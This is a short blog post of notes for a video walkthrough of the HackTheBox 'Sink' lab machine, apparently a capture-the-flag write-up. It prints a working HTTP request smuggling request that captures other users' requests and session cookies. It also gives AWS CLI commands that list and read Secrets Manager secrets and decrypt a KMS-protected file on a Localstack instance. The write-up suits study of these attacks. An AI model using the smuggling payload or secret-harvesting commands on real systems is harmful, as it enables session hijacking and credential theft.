---
categories:
- CTF
image:
  path: https://img.youtube.com/vi/41ziR8y-1T0/0.jpg
layout: post
media_subpath: /assets/posts/2021-09-18-http-request-smuggling-aws-sink-hackthebox
tags:
- aws
- hackthebox
- smuggling
- linux
- localstack
title: HTTP Request Smuggling & AWS - Sink @ HackTheBox
---

We are solving Sink, a 50-point Linux machine on HackTheBox that involves HTTP Request Smuggling & retrieving secrets from Localstack.

{% youtube 41ziR8y-1T0 %}


## Notes

**Reads**

- <https://nathandavison.com/blog/haproxy-http-request-smuggling>

- <https://portswigger.net/web-security/request-smuggling>

**Example Smuggling Request**

```
POST /comment HTTP/1.1
Host: sink.htb:5000
Cookie: session=eyJlbWFpbCI6InhjdEBleGFtcGxlLmNvbSJ9.YUMdpw.xLkQCSRKf7EfIxXMMBDR8i8Pi9M
Content-Type: application/x-www-form-urlencoded
Content-Length: 215
Transfer-Encoding:chunked

0

POST /comment HTTP/1.1
Host: sink.htb:5000
Content-Type: application/x-www-form-urlencoded
Content-Length: 290
Cookie: session=eyJlbWFpbCI6InhjdEBleGFtcGxlLmNvbSJ9.YUMdpw.xLkQCSRKf7EfIxXMMBDR8i8Pi9M

msg=
```

**AWS CLI Commands**

```
aws --endpoint-url=http://127.0.0.1:4566 kms list-keys
aws --endpoint-url=http://127.0.0.1:4566 secretsmanager list-secrets
aws --endpoint-url=http://127.0.0.1:4566 secretsmanager get-secret-value --secret-id "arn:aws:secretsmanager:us-east-1:1234567890:secret:Jira Support-yVNfw"
aws kms decrypt --ciphertext-blob fileb:///home/david/Projects/Prod_Deployment/servers.enc --query Plaintext --output text --endpoint-url=http://127.0.0.1:4566 --key-id=804125db-bdf1-465a-a058-07fc87c0fad0 --encryption-algorithm RSAES_OAEP_SHA_256
```